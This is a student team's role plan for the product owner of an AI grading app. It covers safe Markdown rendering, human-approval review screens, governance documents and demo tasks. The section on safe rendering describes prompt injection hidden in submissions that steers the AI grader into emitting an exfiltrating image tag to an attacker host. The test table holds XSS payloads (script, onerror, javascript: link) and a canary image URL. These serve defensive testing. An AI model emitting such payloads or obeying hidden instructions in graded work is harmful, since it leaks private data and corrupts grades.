# Person A · Product Owner

You build what the instructor and students actually see, and you own the story the team tells about it. That means the React front end, the main workflow end to end, the review and confirmation screens where the human-approval controls live, the business-objective measurements, the governance documents (system card, disclosure statement, residual risk) and the demo. The screens matter for security more than they look: C25 and C36 only work if the instructor sees the real data in a way that makes a wrong grade noticeable.

Read `README.md` and `01-interfaces.md` first. You don't own a section of `01-interfaces.md`, but §10 (API) is your contract with the backend; raise a PR there if a screen needs something the API doesn't give.

## What you own

| Kind | Items |
|---|---|
| Controls | C07 in the browser (safe Markdown rendering; D strips images and HTML on the server; E sets the CSP), C25 confirmation screens (with C), C36 review screen (with C), C37 audit and manual-queue screens (with C), the pause button for C30 (E builds the switch) |
| Requirements | R10 human approval (the screens; D's release service enforces it), the "working application" criterion: main workflow end to end from the README |
| Verification tests | T-09 (browser side), T-10, the end-to-end workflow test, and the T-37 / BO2 measurement |
| Report | §7 governance (system card, audit-trail design with C and E, disclosure statement), §8 residual risk, §9 lessons learned and contribution log |
| Other | Slides, demo script, the BO1–BO5 measurements, the question to the instructor about the due date |

## Timeline

| ID | Task | Due | Depends on |
|---|---|---|---|
| A0 | Ask the instructor whether code and report are due Monday 7 or Wednesday 9 December; tell the team | **Mon 23 Nov** | — |
| A1 | React shell: routing, login and TOTP pages, API client, layout, npm hardening | Wed 25 Nov | E1, E4 |
| A2 | Walking-skeleton screens: rubric editor, submit, review list, approve with re-auth, student grade view | **Fri 27 Nov** | D3, D6, C4 |
| A3 | Safe rendering component and lint rule | Mon 30 Nov | A1 |
| A4 | Blind hand-grading sample for BO2 prepared and graded by a teammate | Mon 30 Nov | D2 |
| A5 | Full review screen (C36) | Tue 1 Dec | C5 |
| A6 | Chat panel, appeals, blog, materials upload and approval | Wed 2 Dec | C6, D4, D7 |
| A7 | Confirmation screens (C25), manual queue, audit view, pause button | Wed 2 Dec | C7, E10, E11 |
| A8 | End-to-end test, T-09 browser test, T-10 | Thu 3 Dec | A2–A7 |
| A9 | BO measurement script and the T-37 / BO2 comparison on the real model | Mon 7 Dec | C10 |
| A10 | System card, disclosure statement, audit-trail write-up, residual risk, lessons and contribution log | Mon 7 Dec | owners' input |
| A11 | Slides, demo script, two full rehearsals, backup recording | Tue 8 Dec | everything |

---

## A0 · The due date

The brief says "Monday 9 December", and 9 December 2026 is a Wednesday. Ask the instructor today which one is meant, and post the answer to the team. Until you hear back, the plan treats Monday 7 December as a soft deadline and Wednesday 9 December as the real one.

## A1 · React shell and the npm supply chain

**Why the hardening.** Choosing React adds a second package ecosystem to our supply chain. npm packages can run install scripts on every developer machine and in CI, which is a common way malicious packages execute. Keeping the dependency list short and turning install scripts off removes most of that risk at little cost.

1. `npm create vite@<pinned version>` with the React + TypeScript template in `frontend/`. Run the admission check on every package you add, and paste the output in the PR.
2. `frontend/.npmrc`:

   ```
   ignore-scripts=true
   save-exact=true
   fund=false
   ```

   Always install with `npm ci` in CI and Docker. Commit `package-lock.json`.
3. Keep runtime dependencies to `react`, `react-dom`, a router and `react-markdown`. No UI kit, no analytics, no third-party fonts or scripts from a CDN (the CSP blocks them anyway). Dev dependencies: Vite, TypeScript, ESLint with the React plugin, Vitest with Testing Library, Playwright.
4. `src/api.ts`: one `fetch` wrapper that sends cookies, adds the `X-CSRF-Token` header on non-GET requests, handles `401 reauth_required` by opening the re-auth modal and retrying once, and never stores tokens in `localStorage`.
5. Login page, TOTP page for instructors, role-based navigation (student vs instructor), course switcher.
6. The production build is served by the `web` service. Check that the built app works under the CSP in `01-interfaces.md` §10 (no inline scripts or styles; Vite's default build complies, but check the browser console).

## A2 · Walking-skeleton screens (Fri 27 Nov)

Just enough for the demo's main flow on the fake model:

- **Instructor:** create assignment; rubric editor with rows of `{label, max_points, kind}`; answer-key editor per criterion (objective criteria take an expected value and tolerance); publish (re-auth).
- **Student:** assignment page, submission form (text, optional PDF, objective answers), "my grades" with released grades only.
- **Instructor:** review list for an assignment with proposed totals; approve selected (re-auth modal).

## A3 · Safe rendering (C07, browser side)

**Why.** Feedback, chat replies and rationales are written by a model that may have read injected text. If the browser renders them as HTML, an injected `<img src="https://attacker/?data=...">` sends private text out (T-09), and a script runs in the instructor's session (T-10). The server strips images and raw HTML (D), the CSP blocks remote images and inline scripts (E), and this component never creates HTML from model text at all. Three independent layers, each tested on its own.

`src/components/SafeMarkdown.tsx`:

```tsx
import ReactMarkdown from "react-markdown";

const LINK_HOSTS = new Set([window.location.host /* add course-approved hosts here */]);

function allowedHref(href?: string): string | null {
  if (!href) return null;
  try {
    const u = new URL(href, window.location.origin);
    if (u.protocol !== "https:" && u.protocol !== "http:") return null;
    return LINK_HOSTS.has(u.host) ? u.toString() : null;
  } catch { return null; }
}

export function SafeMarkdown({ text }: { text: string }) {
  return (
    <ReactMarkdown
      skipHtml
      components={{
        img: ({ alt }) => <span className="removed">[image removed{alt ? `: ${alt}` : ""}]</span>,
        a: ({ href, children }) => {
          const ok = allowedHref(href);
          return ok
            ? <a href={ok} rel="noopener noreferrer nofollow" target="_blank">{children}</a>
            : <span title={href}>{children}</span>;
        },
      }}
    >
      {text}
    </ReactMarkdown>
  );
}
```

Check the pinned `react-markdown` version's API names (`skipHtml`, `components`, and its URL-transform option) before relying on them. Never use `dangerouslySetInnerHTML`: set the ESLint rule `react/no-danger` to `error` so CI fails if anyone does. Every model-written string in the app goes through `SafeMarkdown` or is shown as plain text.

## A5 · Review screen (C36, C05)

**Why.** Human approval is our last check on the residual risk M1 accepted: a believable but wrong score inside the rubric's range (T-37, and the in-range part of T-04). An approval screen that shows a list of totals and an "Approve all" button invites approving without reading. This screen is designed to make suspicious grades stand out and to show the instructor exactly what the grader read, so hidden text becomes visible.

`/courses/:id/assignments/:aid/review`:

- **Queue**, flagged items first. Columns: student (display name is fine here; this is the instructor's own screen), proposed total out of maximum, flags as badges.
- **Detail view** for one submission:
  - Left: the extracted text exactly as the grader read it (`GET /submissions/{id}/extracted-text`), in a monospace block that preserves whitespace and shows invisible characters (zero-width spaces, unusual Unicode) as visible markers. White-on-white text in the original PDF is ordinary text here, which is the point. Add a short note at the top: "This is the text the AI grader read, including any text that was hidden in the original file."
  - Right: per criterion, the maximum, attempt 1, attempt 2, the proposed score (editable, within the maximum), the AI-written feedback through `SafeMarkdown`, labelled "Written by the AI grader", and any quotes it relied on (a `quote_not_found` flag shows next to quotes that aren't in the text). Objective criteria show the student's answer, the expected answer and the code's mark.
  - Citations with their verdicts.
  - Flags explained in one line each: `full_marks` ("Every criterion at maximum; check that the answer earns it"), `disagreement`, `outlier`, `quote_not_found`, `citation_not_supported`, `feedback_contains_key_text`.
- **Approving:** unflagged items can be selected together; flagged items can only be approved from their detail view. Approving opens the re-auth modal if the last re-auth is older than the window, then calls `POST /api/proposed-grades/approve` with any score changes.

## A6 · Student-facing features

- **Chat panel** on the course page. Each answer shows its sources with a badge: "Instructor material", "Third-party source", "Instructor blog post", "Comment by a student". The fixed answer-key message from C23 is shown as a system notice. Messages render through `SafeMarkdown`.
- **My grades:** released grades with feedback (`SafeMarkdown`), and "Ask about this grade" which opens the chat with context, or "Appeal" which opens a form (`open_appeal` through the chat agent, or a plain form calling the same backend path; agree with C which).
- **Blog:** posts and comments, comments marked as written by students.
- **Instructor materials page:** upload, see parse status, read the extracted text, publish (re-auth). This is the instructor sign-off in C04.

## A7 · Confirmation screens, manual queue, audit view, pause

**Confirmation screens (C25).** For an instructor-agent proposal or draft, `GET /api/grade-change-proposals/{id}` or `GET /api/drafts/{id}` returns database values. Show:

- current released scores and proposed scores side by side per criterion, with maximums;
- the appeal text in a box labelled "Written by the student";
- the agent's rationale in a box labelled "Written by the AI assistant: check it against the submission";
- a link to the submission's extracted text;
- Accept and Reject, both requiring re-auth.

Never show the agent's summary in place of the real numbers. The test for C25 is that the screen's numbers come from the database response, not from the agent's text.

**Manual queue (C37, C30).** List of items with reason codes in plain words ("Grading paused", "Grader output failed validation", "Step limit reached"). Opening one shows the extracted text and a rubric form; submitting sends the instructor's scores through the release service (`record-manual-grade`).

**Audit view (C37).** `/courses/:id/audit`: a filterable table (time, actor, on behalf of, action, decision, reason code, summary) with the chain status from E's verifier shown at the top, and E's alerts as a banner. This is the screen used in demo step 7, so make it easy to filter to one run or one student.

**Pause button (C30).** On the course settings page: "Pause AI agents for this course" with a reason field, re-auth, and a visible banner on every instructor page while paused. Students see that grading may take longer but can still submit.

## A8 · Your tests

| Test | Threat | Canary or input | Controls | Expected |
|---|---|---|---|---|
| `tests/e2e/test_main_workflow.spec.ts` | — (working application) | The demo's steps 1–3 on the fake model | — | Passes from a fresh `make up && make seed` |
| `tests/verification/test_T10_xss.py` (drives Playwright) | T-10 | Feedback written directly to the database (bypassing D's server filter so this layer is tested alone) containing `<script>window.CANARY_T10=1</script>`, `<img src=x onerror="window.CANARY_T10=1">` and `[click](javascript:window.CANARY_T10=1)` | C07 | `window.CANARY_T10` is undefined after rendering and clicking; no `<script>` or `<img>` from content in the DOM; the link is plain text; the response has the CSP header |
| `tests/verification/test_T09_browser_image.py` | T-09 | Feedback in the database: `![x](https://canary.example/?d=CANARY-T09-4e2f)` | C07 | No `<img>` with that source; Playwright's request log shows no request to `canary.example` |
| Unit tests (Vitest) | — | `SafeMarkdown` with images, raw HTML, `javascript:` and off-list links | C07 | Rendered output as above |

## A9 · Business-objective measurements and T-37

`scripts/bo_metrics.py` prints the measures from M1 §1.2, computed from the database, for the report:

| BO | Measure | Source |
|---|---|---|
| BO1 | Time from the deadline to the last proposed grade for an assignment | `grading_runs`, `proposed_grades` |
| BO2 | Share of agent criterion scores within one rubric point of the instructor's blind score | agent scores from `grading_results`; blind scores from the sample below |
| BO3 | Instructor time to review and approve, compared with time to hand-grade | timestamps from the review screen and the manual-queue screen (both written to the audit log) |
| BO4 | Questions the chat agent answered without referring to the instructor, out of all questions | `chat_transcripts`; agree with C on a fixed referral sentence in `prompts/chat.md` so code can count referrals |
| BO5 | Released grades without a matching approval in the audit log (must be zero) | `proposed_grades` joined with `audit_log` |

**The BO2 / T-37 sample.** This is also how we measure our one accepted risk honestly. Choose a set of seeded essay-style submissions (with D) that vary in quality. A teammate who is not C grades them by hand against the rubric **before** seeing any agent score, and saves the scores in `seed/blind_grades.csv`. Then run grading on the real model and compare. Report the sample size, the agreement figure you actually observe, and the cases where the agent was confidently wrong. These are synthetic essays graded by a student acting as instructor, and the report must say so; it shows the method, not a real classroom result. Don't put any figure in the report or slides that didn't come out of this script.

## A10 · Governance documents

**System card (`docs/system-card.md`, 2–4 pages, Appendix B outline).** Written for engineers and operators. Collect facts from the owners rather than writing them from memory:

1. System overview: purpose, users (instructors, students), deployment (local Compose, synthetic data).
2. Models and components: from C's R7 note and E's SBOM (provider, model snapshots, embedding model revision).
3. Capabilities and authority: each agent's tools (from `01-interfaces.md` §5), what each can change, and the list of actions that need human approval with the reason the line sits there.
4. Data: what's read, stored and sent to the provider; retention in our database; the seed-data provenance (D's `docs/seed-data.md`).
5. Intended use and out-of-scope use (for example: not for high-stakes exams without human grading; not for scanned or handwritten work).
6. Known limitations and failure modes, including T-37 and the other residual risks, with the measured figures from A9 and B's verification report.
7. Security controls summary: the main defences and where they sit (one short table).
8. Monitoring and incident response: from E's alert rules and runbook.
9. Reporting issues: the disclosure statement.
10. Change log.

**Disclosure statement.** Short and usable: where to report (a team security address or the repository's private vulnerability reporting, not a personal email), what to include, what we commit to (acknowledge within a stated time, investigate, fix, tell the reporter, credit if they want), and what we ask in return (synthetic data only, no testing of other teams' systems). Agree the response times with the team; don't promise what five students can't keep.

**Audit-trail design (with C and E).** What each row holds, how the chain works, who can read it, how a disputed grade is traced from the released score back to the submission, rubric and key versions, model and prompt versions, tool calls and approver (SO7).

**Residual risk (§8).** For each accepted or open risk: what remains, the business consequence in plain words, and what keeps it small. At least: T-37 (accepted), a fooled grader's in-range score, a paraphrased answer key passing C23, an instructor approving without reading, a poisoned source an instructor approved, the provider's retention of prompts, and anything B's verification results leave open.

**Lessons learned and contribution log (§9).** Ask each member for five lines on what they built and one lesson. Back the contribution log with commit history, PRs reviewed and report sections written.

## A11 · Demo and slides

The demo plan is in `README.md` §5. You own the script and timing (10 minutes, every member presents); B owns the control demos inside it.

- Write the script with who says what and how long each step takes. Leave the controls and the audit log the most time.
- Prepare the demo database with `make seed CANARIES=1` and check it the morning of.
- Rehearse twice on Tue 8 Dec, once on the clean machine.
- Record a backup video of the full demo on Mon 7 Dec in case something fails live.
- Slides: one idea per slide, titles that state the point, the residual risk slide last.

## Questions you should be ready for

- Where exactly is the line for human approval, and why there?
- How does the review screen help an instructor catch a hidden instruction?
- What is the one risk you accepted, and how did you measure it?
- How would someone report a vulnerability in Rubrica, and what would happen next?
